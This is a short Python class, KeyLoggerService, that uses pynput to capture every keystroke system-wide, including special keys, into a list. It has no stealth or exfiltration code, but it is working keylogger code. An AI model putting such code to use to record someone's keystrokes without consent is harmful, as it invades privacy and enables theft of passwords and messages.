from pynput.keyboard import Listener,Key

from IKeyLogger import IKeyLogger
from typing import List
class KeyLoggerService(IKeyLogger):
    def __init__(self):
        self.listener = None
        self.logged_keys: List[str] = []


    def start_logging(self) -> None:
        self.listener = Listener(on_press = self.on_press)
        self.listener.start()

    def stop_logging(self) -> None:
        self.listener.stop()

    def get_logged_keys(self) -> List[str]:
        return self.logged_keys

    def on_press(self, key):
        try:
            if key == Key.space:
                char = " "
            elif key == Key.enter:
                char = "\n"
            elif key == Key.backspace:
                char = "[BACKSPACE]"
            elif hasattr(key, 'char') and key.char is not None:
                char = key.char
            else:
                char = f"[{key.name}]"  # לוכד מקשים מיוחדים

            self.logged_keys.append(char)



        except AttributeError:
            pass







